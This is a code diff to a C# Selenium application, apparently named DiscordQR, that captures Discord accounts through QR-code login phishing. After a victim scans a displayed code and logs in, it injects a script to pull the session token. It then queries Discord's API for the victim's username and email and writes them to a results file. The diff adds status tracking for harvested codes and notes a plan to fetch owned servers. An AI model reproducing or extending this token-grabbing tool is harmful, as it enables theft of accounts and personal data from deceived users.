@@ -10,7 +10,6 @@ using OpenQA.Selenium;
 using OpenQA.Selenium.Firefox;
 using OpenQA.Selenium.Support.UI;
 using System.Net;
-using System.IO;
 
 namespace DiscordQR
 {
@@ -18,15 +17,16 @@ namespace DiscordQR
     {
         private List<Image> qrList = new List<Image>();
         private List<IWebDriver> drivers = new List<IWebDriver>();
-
         private Dictionary<int, Discord> dict = new Dictionary<int, Discord>();
         private int currentIndex = 0;
+
         public Form1()
         {
             if (!Directory.Exists("results")) Directory.CreateDirectory("results");
             InitializeComponent();
             this.pictureBox1.Image = Image.FromFile("files/template.png");
         }
+
         [STAThread]
         public void SeleniumHandler()
         {
@@ -89,37 +89,37 @@ namespace DiscordQR
 
                 dataGridView1.Invoke((Action)delegate
                 {
-                    dataGridView1.Rows.Add(d.QrCodeId, d.DiscordToken, d.DiscordUsername, d.DiscordEmail);
+                    dataGridView1.Rows.Add(d.QrCodeId, d.DiscordToken, d.DiscordUsername, d.DiscordEmail, "", "", d.Status);
+                    dataGridView1.CurrentRow.Cells[6].Style.BackColor = Color.Yellow;
                 });
 
                 currentIndex += 1;
-
 
                 pictureBox1.Invoke((Action)delegate
                 {
                     this.pictureBox1.Image = finalResult;
                 });
+
                 log("Waiting for login on QR #" + workingIndex);
-                wait = new WebDriverWait(driver, TimeSpan.FromSeconds(300));
+                wait = new WebDriverWait(driver, TimeSpan.FromSeconds(140));
                 wait.Until(webDriver => webDriver.Url != "https://discord.com/login");
 
                 string token = ((IJavaScriptExecutor)driver).ExecuteScript(File.ReadAllText("files/token.js")).ToString();
-
                 d.DiscordToken = token;
-
-                WebRequest request = WebRequest.Create("https://canary.discord.com/api/v8/users/@me");
-                request.Method = "GET";
-                request.ContentType = "application/json";
-
-                request.Headers["Authorization"] = token;
-
-                Stream response = request.GetResponse().GetResponseStream();
-                string jsonData = new StreamReader(response).ReadToEnd();
+                
+                string jsonData = HTTPGet("https://canary.discord.com/api/v8/users/@me", token);
+                
                 Dictionary<string, object> dictionary = (Dictionary<string, object>)Json.Deserialize(jsonData);
 
                 d.DiscordUsername = dictionary["username"].ToString();
                 d.DiscordEmail = dictionary["email"].ToString();
-                log(d.DiscordUsername + " Logged in  QR #s" + workingIndex);
+                d.Status = "Used";
+                log(d.DiscordUsername + " Logged in QR #" + workingIndex);
+
+                
+                //string guildsData = HTTPGet("https://canary.discord.com/api/v8/users/@me/guilds", token);
+                //Maybe later to get owned guilds
+
                 SafeWriter("results/results.txt", d.ToString());
 
                 dict[workingIndex] = d;
@@ -131,7 +131,8 @@ namespace DiscordQR
             }
             catch (WebDriverException ex)
             {
-                dict.Remove(workingIndex);
+                //dict.Remove(workingIndex);
+                dict[workingIndex].Status = "Expired";
                 dataGridView1.Invoke((Action)delegate
                 {
                     update();
@@ -140,12 +141,38 @@ namespace DiscordQR
             catch (Exception ex) { MessageBox.Show(ex.Message, "Error"); }
         }
 
+        private string HTTPGet(string url, string token)
+        {
+            WebRequest request = WebRequest.Create(url);
+            request.Method = "GET";
+            request.ContentType = "application/json";
+
+            request.Headers["Authorization"] = token;
+
+            Stream response = request.GetResponse().GetResponseStream();
+            return new StreamReader(response).ReadToEnd();
+        }
+
         private void update()
         {
             dataGridView1.Rows.Clear();
             foreach (Discord d in dict.Values)
             {
-                dataGridView1.Rows.Add(d.QrCodeId, d.DiscordToken, d.DiscordUsername, d.DiscordEmail);
+                dataGridView1.Rows.Add(d.QrCodeId, d.DiscordToken, d.DiscordUsername, d.DiscordEmail, "", "", d.Status);
+                switch (d.Status)
+                {
+                    case "Expired":
+                        dataGridView1.CurrentRow.Cells[6].Style.BackColor = Color.Red;
+                        break;
+                    case "Available":
+                        dataGridView1.CurrentRow.Cells[6].Style.BackColor = Color.Yellow;
+                        break;
+                    case "Used":
+                        dataGridView1.CurrentRow.Cells[6].Style.BackColor = Color.Green;
+                        break;
+
+                }
+                
             }
         }
 
